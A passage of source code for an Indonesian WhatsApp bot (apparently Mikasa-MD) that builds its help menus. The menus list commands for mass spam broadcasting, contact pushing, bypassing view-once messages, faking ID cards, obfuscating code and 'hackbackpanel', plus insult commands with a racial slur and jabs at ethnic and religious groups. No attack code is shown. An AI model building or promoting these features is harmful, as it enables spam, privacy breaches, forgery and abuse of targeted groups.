ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaOwner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

${ki}[ Mikasa Information ]${ki}
┌  ◦ ɴᴀᴍᴇ ʙᴏᴛ : ${global.botname}
│  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
│  ◦ ʙᴀɪʟᴇʏs : ${global.baileys}
│  ◦ ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
└  ◦ ғʀᴇғɪx : [ ᴍᴜʟᴛɪᴘʀᴇғɪx ]

${ki}[ User Information ]${ki}
┌  ◦ sᴛᴀᴛᴜs : ${isCreator ? 'ᴏᴡɴᴇʀ' : isUserPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
│  ◦ ɴᴏᴍᴏʀ :  @${m?.sender.split('@')[0]} 
└  ◦ ɴᴀᴍᴇ : ${m.pushName}

──────────────────
*<> [ ᴅᴏᴡɴʟᴏᴀᴅ - ᴍᴇɴᴜ ] <>*
┏─────────────────
┃  ❏ ${prefix}tiktok
┃  ❏ ${prefix}tiktokmp3
┃  ❏ ${prefix}facebook
┃  ❏ ${prefix}capcut
┃  ❏ ${prefix}instagram
┃  ❏ ${prefix}ytmp3
┃  ❏ ${prefix}ytmp4
┃  ❏ ${prefix}play
┃  ❏ ${prefix}playvid
┃  ❏ ${prefix}gitclone
┃  ❏ ${prefix}mediafire
┗═━═━═━═━═━═━═━═━═╴`
        Putzz.sendMessage(m.chat, {
        text: fun,
        contextInfo: {
            externalAdReply: {
                title: `Mikasa-MD Made With`,
                body: `Putzzslebew`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.ceha,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: qtext })
};
break;*/
case 'putz-store':
case "mstr": case "menustore": case "storemenu": {
let fun = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaOwner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

${ki}[ Mikasa Information ]${ki}
┌  ◦ ɴᴀᴍᴇ ʙᴏᴛ : ${global.botname}
│  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
│  ◦ ʙᴀɪʟᴇʏs : ${global.baileys}
│  ◦ ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
└  ◦ ғʀᴇғɪx : [ ᴍᴜʟᴛɪᴘʀᴇғɪx ]

${ki}[ User Information ]${ki}
┌  ◦ sᴛᴀᴛᴜs : ${isCreator ? 'ᴏᴡɴᴇʀ' : isUserPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
│  ◦ ɴᴏᴍᴏʀ :  @${m?.sender.split('@')[0]} 
└  ◦ ɴᴀᴍᴇ : ${m.pushName}

──────────────────
*<> [ sᴛᴏʀᴇ - ᴍᴇɴᴜ ] <>*
┏─────────────────
┃  ❏ ${prefix}addrespon
┃  ❏ ${prefix}delrespon
┃  ❏ ${prefix}listrespon
┃  ❏ ${prefix}done
┃  ❏ ${prefix}proses
┃  ❏ ${prefix}jpm
┃  ❏ ${prefix}jpm2
┃  ❏ ${prefix}jpmtesti
┃  ❏ ${prefix}jpmslide
┃  ❏ ${prefix}jpmslideht
┃  ❏ ${prefix}jpmch
┃  ❏ ${prefix}jpmchfoto
┃  ❏ ${prefix}jpmvideo
┃  ❏ ${prefix}addidch
┃  ❏ ${prefix}delidch
┃  ❏ ${prefix}sendtesti
┃  ❏ ${prefix}pushkontak 〕button〔
┃  ❏ ${prefix}pushkontak2
┃  ❏ ${prefix}payment
┃  ❏ ${prefix}produk
┗═━═━═━═━═━═━═━═━═╴`
        Putzz.sendMessage(m.chat, {
        text: fun,
        contextInfo: {
            externalAdReply: {
                title: `Mikasa-MD Made With`,
                body: `Putzzslebew`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.ceha,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: qtext })
};
break;
case 'putz-panel':
case "mpnl": case "menucpanel": case "cpanelmenu": {
let fun = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaOwner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

${ki}[ Mikasa Information ]${ki}
┌  ◦ ɴᴀᴍᴇ ʙᴏᴛ : ${global.botname}
│  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
│  ◦ ʙᴀɪʟᴇʏs : ${global.baileys}
│  ◦ ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
└  ◦ ғʀᴇғɪx : [ ᴍᴜʟᴛɪᴘʀᴇғɪx ]

${ki}[ User Information ]${ki}
┌  ◦ sᴛᴀᴛᴜs : ${isCreator ? 'ᴏᴡɴᴇʀ' : isUserPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
│  ◦ ɴᴏᴍᴏʀ :  @${m?.sender.split('@')[0]} 
└  ◦ ɴᴀᴍᴇ : ${m.pushName}

──────────────────
*<> [ ᴘᴀɴᴇʟ - ᴍᴇɴᴜ ] <>*
┏─────────────────
┃  ❏ ${prefix}addseller
┃  ❏ ${prefix}delseller
┃  ❏ ${prefix}listseller
┃  ❏ ${prefix}1gb
┃  ❏ ${prefix}2gb
┃  ❏ ${prefix}3gb
┃  ❏ ${prefix}4gb
┃  ❏ ${prefix}5gb
┃  ❏ ${prefix}6gb
┃  ❏ ${prefix}7gb
┃  ❏ ${prefix}8gb
┃  ❏ ${prefix}9gb
┃  ❏ ${prefix}10gb
┃  ❏ ${prefix}unlimited
┃  ❏ ${prefix}cadmin
┃  ❏ ${prefix}delpanel
┃  ❏ ${prefix}deladmin
┃  ❏ ${prefix}listpanel
┃  ❏ ${prefix}listadmin 
┃  ❏ ${prefix}hackbackpanel
┃  ❏ ${prefix}installpanel
┃  ❏ ${prefix}installtemastellar
┃  ❏ ${prefix}installtemabilling
┃  ❏ ${prefix}installtemaenigma
┃  ❏ ${prefix}uninstallpanel
┃  ❏ ${prefix}uninstalltema
┗═━═━═━═━═━═━═━═━═╴`
        Putzz.sendMessage(m.chat, {
        text: fun,
        contextInfo: {
            externalAdReply: {
                title: `Mikasa-MD Made With`,
                body: `Putzzslebew`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.ceha,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: qtext })
};
break;

case "menuu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `⏤͟͟͞͞╳─ *[ \`ʙᴏᴛ - ɪɴғᴏ\` ]* ─ᯤ
> ♞︱ *ᴄʀᴇᴀᴛᴏʀ:* ${namaOwner}
> ♞︱ *ɴᴀᴍᴀ ʙᴏᴛ:* ${botname}
> ♞︱ *ᴠᴇʀsɪ:* \`${versi}\`
> ♞︱ *ᴛᴏᴛᴀʟ ғɪᴛᴜʀ:* ${totalFitur()}
> ♞︱ *ᴛʏᴘᴇ:* ᴄᴀsᴇ

⏤͟͟͞͞╳─ [ \`ᴜsᴇʀ - ɪɴғᴏ\` ] ─ᯤ
> *║◦ɴᴀᴍᴀ:* ${m.pushName}
> *║◦ᴀᴄᴄᴇss:* ${isCreator ? 'ᴏᴡɴᴇʀ' : isUserPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
> *║◦ɴᴜᴍʙᴇʀ:* ${m.sender.split('@')[0]}

${readmore}
╭━┉═━━[ ᴘᴜᴛᴢᴢ ʙᴏᴛ ]
┃  ❏ ${prefix}ᴄᴇᴋɪᴅᴄʜ
┃  ❏ ${prefix}ᴄᴇᴋɪᴅɢᴄ
┃  ❏ ${prefix}ǫᴄ
┃  ❏ ${prefix}ʙʀᴀᴛ
┃  ❏ ${prefix}ʙʀᴀᴛᴠɪᴅ
┃  ❏ ${prefix}ᴛᴛᴘ
┃  ❏ ${prefix}ᴛᴛᴘ2
┃  ❏ ${prefix}ᴀᴛᴛᴘ
┃  ❏ ${prefix}ᴀᴛᴛᴘ2
┃  ❏ ${prefix}ʀᴇᴀᴅᴠɪᴇᴡᴏɴᴄᴇ
┃  ❏ ${prefix}sᴛɪᴄᴋᴇʀᴡᴍ
┃  ❏ ${prefix}sᴛɪᴄᴋᴇʀ
┃  ❏ ${prefix}sᴍᴇᴍᴇ
┃  ❏ ${prefix}ᴛᴏɪᴍɢ
┃  ❏ ${prefix}ғᴀᴋᴇᴋᴛᴘ
┃ 🥳 .ᴀᴘᴋǫʀɪs
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━━『 sᴇᴀʀᴄʜᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ʏᴛs
┃  ❏ ${prefix}ᴀᴘᴋᴍᴏᴅ
┃  ❏ ${prefix}ᴘɪɴᴛᴇʀᴇsᴛ
┃  ❏ ${prefix}ɢɪᴍᴀɢᴇ  
┃  ❏ ${prefix}sғɪʟᴇ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━━『 ᴛᴏᴏʟsᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴀɪ
┃  ❏ ${prefix}ɢᴘᴛ
┃  ❏ ${prefix}ᴛᴏᴜʀʟ
┃  ❏ ${prefix}ᴛᴏᴜʀʟ2
┃  ❏ ${prefix}ᴛᴏᴜʀʟ3
┃  ❏ ${prefix}ssᴡᴇʙ
┃  ❏ ${prefix}ᴛʀᴀɴsʟᴀᴛᴇ
┃  ❏ ${prefix}ᴛᴏʜᴅ
┃  ❏ ${prefix}sʜᴏʀᴛʟɪɴᴋ
┃  ❏ ${prefix}sʜᴏʀᴛʟɪɴᴋ2
┃  ❏ ${prefix}ᴇɴᴄ
┃  ❏ ${prefix}ᴇɴᴄʜᴀʀᴅ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━━『 Shopmenu ☣︎ 』
┃  ❏ ${prefix}ʙᴜʏᴘᴀɴᴇʟ
┃  ❏ ${prefix}ʙᴜʏᴀᴅᴘ
┃  ❏ ${prefix}ʙᴜʏsᴄʀɪᴘᴛ
┃  ❏ ${prefix}ʙᴜʏᴠᴘs
┗═━═━═━═━═━═━═━═━═━═━
┏━━━『 ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴛɪᴋᴛᴏᴋ
┃  ❏ ${prefix}ᴛɪᴋᴛᴏᴋᴍᴘ3
┃  ❏ ${prefix}ғᴀᴄᴇʙᴏᴏᴋ
┃  ❏ ${prefix}ᴄᴀᴘᴄᴜᴛ
┃  ❏ ${prefix}ɪɴsᴛᴀɢʀᴀᴍ
┃  ❏ ${prefix}ʏᴛᴍᴘ3
┃  ❏ ${prefix}ʏᴛᴍᴘ4
┃  ❏ ${prefix}ᴘʟᴀʏ
┃  ❏ ${prefix}ᴘʟᴀʏᴠɪᴅ
┃  ❏ ${prefix}ɢɪᴛᴄʟᴏɴᴇ
┃  ❏ ${prefix}ᴍᴇᴅɪᴀғɪʀᴇ
┗═━═━═━═━═━═━═━═━═╴
┏━━━━━━━『 ғᴜɴᴍᴇɴᴜ 』
┃  ❏ ${prefix}ᴀᴘᴀᴋᴀʜ 
┃  ❏ ${prefix}ʙᴀɢᴀɪᴍᴀɴᴀᴋᴀʜ  
┃  ❏ ${prefix}ᴋᴀᴘᴀɴᴋᴀʜ 
┃  ❏ ${prefix}ʙɪꜱᴀᴋᴀʜ 
┃  ❏ ${prefix}ꜱᴀɴɢᴇᴄᴇᴋ 
┃  ❏ ${prefix}ᴄᴀɴᴛɪᴋᴄᴇᴋ 
┃  ❏ ${prefix}ɢᴀɴᴛᴇɴɢᴄᴇᴋ 
┃  ❏ ${prefix}ᴊᴏᴍᴏᴋᴄᴇᴋ 
┃  ❏ ${prefix}ᴡᴀɴɢʏ 
┃  ❏ ${prefix}ʀᴀᴛᴇ
┃  ❏ ${prefix}ᴛᴏʟᴏʟ
┃  ❏ ${prefix}ɢᴏʙʟᴏɢ
┃  ❏ ${prefix}ɢᴏʙʟᴏᴋ
┃  ❏ ${prefix}ɪᴅɪᴏᴛ
┃  ❏ ${prefix}ɢᴀʏ
┃  ❏ ${prefix}ᴊᴏᴍᴏᴋ
┃  ❏ ${prefix}ʙᴀᴊɪɴɢᴀɴ
┃  ❏ ${prefix}ᴍᴜɴᴀꜰɪᴋ
┃  ❏ ${prefix}ᴋᴏɴᴛᴏʟ
┃  ❏ ${prefix}ʏᴀᴛɪᴍ
┃  ❏ ${prefix}ᴘᴏᴋᴇ
┃  ❏ ${prefix}ᴘᴇᴍʙᴏᴋᴇᴘ
┃  ❏ ${prefix}ʜɪᴛᴀᴍ
┃  ❏ ${prefix}ᴊᴀᴡᴀ
┃  ❏ ${prefix}ᴡɪʙᴜ
┃  ❏ ${prefix}ꜱᴛʀᴇꜱꜱ
┃  ❏ ${prefix}ᴍɪꜱᴋɪɴ
┃  ❏ ${prefix}ᴄᴀɴᴛɪᴋ
┃  ❏ ${prefix}ᴍᴀɴɪꜱ
┃  ❏ ${prefix}ʙᴀʙɪ
┃  ❏ ${prefix}ɢᴀɴᴛᴇɴɢ
┃  ❏ ${prefix}ᴄɪɴᴀ
┃  ❏ ${prefix}ᴀᴛʜᴇɪꜱ
┃  ❏ ${prefix}ᴘᴀᴘᴜᴀ
┃  ❏ ${prefix}ɴɪɢɢᴀ
┃  ❏ ${prefix}ᴘᴇɴɢᴇɴᴛᴏᴛ
┃  ❏ ${prefix}ꜱᴇᴋꜱɪ
┃  ❏ ${prefix}ᴋᴀᴡᴀɪ
┃  ❏ ${prefix}ᴛᴇʀᴄɪɴᴅᴏ
┃  ❏ ${prefix}ꜰᴇᴍʙᴏᴋᴇꜰ
┃  ❏ ${prefix}ᴘᴇɴɢᴏᴄᴏᴋ
┃  ❏ ${prefix}ᴄᴀʙᴜʟ
┃  ❏ ${prefix}ꜰᴜᴄᴋʙᴏʏ
┃  ❏ ${prefix}ᴘʟᴀʏʙᴏʏ
┃  ❏ ${prefix}ꜱᴀɴɢᴇ
┃  ❏ ${prefix}ꜱᴀɴɢᴇᴀɴ
┃  ❏ ${prefix}ʜᴏᴛ
┃  ❏ ${prefix}ᴀᴘᴀᴋᴀʜ
┃  ❏ ${prefix}ʙᴀɢᴀɪᴍᴀɴᴀ
┃  ❏ ${prefix}ʙɪsᴀᴋᴀʜ
┃  ❏ ${prefix}ɢᴀɴᴛᴇɴɢᴄᴇᴋ
┃  ❏ ${prefix}ᴄᴀɴᴛɪᴋᴄᴇᴋ
┃  ❏ ${prefix}ʜɪᴛᴀᴍᴄᴇᴋ
┃  ❏ ${prefix}ᴋᴀᴘᴀɴᴋᴀʜ
┃  ❏ ${prefix}ᴍᴀʀᴀʜɪʀɪᴘᴇʀ
┃  ❏ ${prefix}ᴡᴀɴɢʏ
┃  ❏ ${prefix}sᴀɴɢᴇᴄᴇᴋ
┗═━═━═━═━═━═━═━═━═━═╴
┏━━━━━『 ᴘʀɪᴍʙᴏɴᴍᴇɴᴜ 』
┃  ❏ ${prefix}ᴀʀᴛɪᴍɪᴍᴘɪ
┃  ❏ ${prefix}ᴀʀᴛɪɴᴀᴍᴀ
┃  ❏ ${prefix}ʀᴀᴍᴀʟᴊᴏᴅᴏʜ
┃  ❏ ${prefix}ʀᴀᴍᴀʟᴊᴏᴅᴏʜʙᴀʟɪ
┃  ❏ ${prefix}ꜱᴜᴀᴍɪɪꜱᴛʀɪ
┃  ❏ ${prefix}ʀᴀᴍᴀʟᴄɪɴᴛᴀ
┃  ❏ ${prefix}ᴄᴏᴄᴏᴋɴᴀᴍᴀ
┃  ❏ ${prefix}ᴘᴀꜱᴀɴɢᴀɴ
┃  ❏ ${prefix}ᴊᴀᴅɪᴀɴɴɪᴋᴀʜ
┃  ❏ ${prefix}ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ
┃  ❏ ${prefix}ʀᴇᴢᴇᴋɪ
┃  ❏ ${prefix}ᴘᴇᴋᴇʀᴊᴀᴀɴ
┃  ❏ ${prefix}ɴᴀꜱɪʙ
┃  ❏ ${prefix}ᴘᴇɴʏᴀᴋɪᴛ
┃  ❏ ${prefix}ᴛᴀʀᴏᴛ
┃  ❏ ${prefix}ꜰᴇɴɢꜱʜᴜɪ
┃  ❏ ${prefix}ʜᴀʀɪʙᴀɪᴋ
┃  ❏ ${prefix}ʜᴀʀɪꜱᴀɴɢᴀʀ
┃  ❏ ${prefix}ʜᴀʀɪꜱɪᴀʟ
┃  ❏ ${prefix}ɴᴀɢᴀʜᴀʀɪ
┃  ❏ ${prefix}ᴀʀᴀʜʀᴇᴢᴇᴋɪ
┃  ❏ ${prefix}ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ
┃  ❏ ${prefix}ᴡᴇᴛᴏɴ
┃  ❏ ${prefix}ᴋᴀʀᴀᴋᴛᴇʀ
┃  ❏ ${prefix}ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ
┃  ❏ ${prefix}ᴍᴇᴍᴀɴᴄɪɴɢ
┃  ❏ ${prefix}ᴍᴀꜱᴀꜱᴜʙᴜʀ
┃  ❏ ${prefix}ᴢᴏᴅɪᴀᴋ
┃  ❏ ${prefix}ꜱʜɪᴏ
┗═━═━═━═━═━═━═━═━═━
┏━━━━『 ᴄᴇʀᴘᴇɴ ᴍᴇɴᴜ 』
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴀɴᴀᴋ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴅᴀᴇʀᴀʜ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀɪɴɢɢʀɪꜱ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴊᴀᴡᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀꜱᴜɴᴅᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʙᴜᴅᴀʏᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀɪꜱʟᴀᴍɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀᴘᴇʀᴛᴀᴍᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀʀᴏᴍᴀɴᴛɪꜱ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴅɪʜ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇɢɪᴛɪɢᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴊᴀᴛɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ɢᴀʟᴀᴜ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ɢᴏᴋɪʟ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴊᴇᴘᴀɴɢ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴋᴇʜɪᴅᴜᴘᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴋᴇʟᴜᴀʀɢᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴋɪꜱᴀʜɴʏᴀᴛᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴋᴏʀᴇᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴋʀɪꜱᴛᴇɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʟɪʙᴜʀᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴍᴀʟᴀʏꜱɪᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴍᴇɴɢʜᴀʀᴜᴋᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴍɪꜱᴛᴇʀɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴍᴏᴛɪᴠᴀꜱɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ɴᴀꜱɪʜᴀᴛ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴏʟᴀʜʀᴀɢᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴀᴛᴀʜʜᴀᴛɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇɴᴀɴᴛɪᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇɴᴅɪᴅɪᴋᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴀʟᴀᴍᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴏʀʙᴀɴᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇɴʏᴇꜱᴀʟᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇʀᴊᴜᴀɴɢᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇʀᴘɪꜱᴀʜᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇʀꜱᴀʜᴀʙᴀᴛᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇᴛᴜᴀʟᴀɴɢᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʀᴀᴍᴀᴅʜᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʀᴇᴍᴀᴊᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʀɪɴᴅᴜ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʀᴏʜᴀɴɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʀᴏᴍᴀɴᴛɪꜱ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ꜱᴀꜱᴛʀᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ꜱᴇᴅɪʜ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ꜱᴇᴊᴀʀᴀʜ
┗═━═━═━═━═━═━═━═━═━═━═╴
┏━━━━━━『 ʀᴀɴᴅᴏᴍᴀɴɪᴍᴇ 』
┃  ❏ ${prefix}ʀᴀɴᴅᴏᴍʙᴀ
┃  ❏ ${prefix}ʀᴀɴᴅᴏᴍ-ᴀɴɪᴍᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴀᴡᴏᴏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴍᴇɢᴜᴍɪɴ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱʜɪɴᴏʙᴜ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜᴀɴᴅʜᴏʟᴅ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜɪɢʜꜰɪᴠᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴄʀɪɴɢᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴅᴀɴᴄᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜᴀᴘᴘʏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇɢʟᴏᴍᴘ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱᴍᴜɢ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙʟᴜꜱʜ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡᴀᴠᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱᴍɪʟᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴘᴏᴋᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡɪɴᴋ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙᴏɴᴋ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙᴜʟʟʏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʏᴇᴇᴛ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙɪᴛᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʟɪᴄᴋ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴋɪʟʟ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴄʀʏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡʟᴘ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴋɪꜱꜱ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜᴜɢ
